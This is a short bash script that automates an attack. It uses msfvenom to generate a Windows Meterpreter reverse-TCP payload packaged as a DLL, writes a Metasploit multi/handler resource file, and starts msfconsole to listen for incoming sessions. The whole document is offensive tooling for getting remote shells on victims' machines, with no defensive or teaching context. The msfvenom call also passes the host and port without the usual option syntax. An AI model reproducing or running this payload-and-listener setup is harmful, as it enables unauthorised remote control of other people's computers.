#!/bin/bash


read -p "Enter your LHOST (IP address): " LHOST
read -p "Enter your LPORT (Port number): " LPORT

msfvenom -p windows/meterpreter/reverse_tcp  -ax86 -f dll $LHOST $LPORT > DJ.dll
ls

cat <<EOF > metasploit_script.rc

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit
EOF

msfconsole -r metasploit_script.rc
